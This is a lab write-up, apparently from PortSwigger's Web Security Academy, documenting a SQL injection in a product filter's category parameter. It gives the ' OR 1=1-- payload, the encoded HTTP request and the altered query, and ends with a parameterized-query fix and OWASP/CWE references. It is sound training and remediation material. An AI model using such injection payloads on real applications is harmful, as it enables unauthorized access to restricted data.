
---
# SQL Injection in WHERE Clause allows Retrieval of Hidden Data

## 1. Executive Summary

A SQL injection vulnerability exists in the application's product filtering functionality, where user-controlled input is incorporated directly into a SQL `WHERE` clause without adequate input handling. By manipulating the category parameter with a SQL injection payload, an attacker can alter the application's database query logic and bypass the intended filtering condition, causing hidden products to be returned.

## 2. Vulnerability Details

- **Vulnerability Type:** SQL Injection (SQLi) — `WHERE` clause
    
- **Target Endpoint/URL:** `/filter`
    
- **Affected Parameter(s):** `category`
    
- **Authentication Level Required:** Unauthenticated
    

The application uses the user-supplied `category` parameter when constructing a SQL query similar to:

```
SELECT * FROM products
WHERE category = 'Gifts'
AND released = 1;
```

The application does not safely parameterize the `category` input. As a result, an attacker can inject additional SQL syntax into the parameter and modify the `WHERE` clause.

## 3. Steps to Reproduce (STR)

1. Access the PortSwigger lab.
    
2. Navigate to the product listing page.
    
3. Select any product category, such as **Gifts**.
    
4. Observe that the application sends a request containing the `category` parameter.
    
5. Intercept the request using Burp Suite.
    
6. Modify the `category` parameter to:
    

```
' OR 1=1--
```

7. Send the modified request to the server.
    
8. The resulting query is effectively interpreted as:
    

```
SELECT * FROM products
WHERE category = '' OR 1=1--'
AND released = 1;
```

9. `1=1` evaluates to `TRUE`, while `--` comments out the remainder of the SQL statement.
    
10. Observe that products that were previously hidden by the application's filtering condition are now returned.
    

## 4. Proof of Concept (PoC)

### HTTP Request/Response

```
GET /filter?category=%27+OR+1%3D1-- HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
User-Agent: Mozilla/5.0
Accept: text/html
Connection: close
```

The server processes the injected input as part of the SQL query.

Conceptually, the original query:

```
SELECT * FROM products
WHERE category = 'Gifts'
AND released = 1;
```

is transformed into:

```
SELECT * FROM products
WHERE category = '' OR 1=1--'
AND released = 1;
```

The injected condition `1=1` is always true, and the `--` sequence comments out the remaining portion of the query.

```
HTTP/1.1 200 OK
Content-Type: text/html

[Product listing containing previously hidden products]
```

### Evidence (Screenshots/Video)

-

## 5. Impact Analysis

- **Technical Impact:** An unauthenticated attacker can manipulate the SQL `WHERE` clause and bypass the application's intended filtering logic. In this lab, this results in retrieval of products that should normally remain hidden.
    
- **Business Impact:** In a real-world application, SQL injection can expose data that the application intentionally restricts from users, potentially resulting in unauthorized disclosure of sensitive business or customer information. Depending on the application's database privileges and query context, SQL injection can also lead to more severe database compromise.
    

## 6. Remediation & References

- **Suggested Fix:** Use parameterized queries/prepared statements instead of dynamically concatenating user-controlled input into SQL statements. For example:
    

```
cursor.execute(
    "SELECT * FROM products WHERE category = %s AND released = 1",
    (category,)
)
```

Additionally, apply appropriate server-side input validation and ensure that the application's database account has only the minimum privileges required.

- **References:**
    
    - OWASP Top 10: A03 — Injection
        
    - OWASP SQL Injection
        
    - CWE-89: Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)
        
    - PortSwigger Web Security Academy — SQL Injection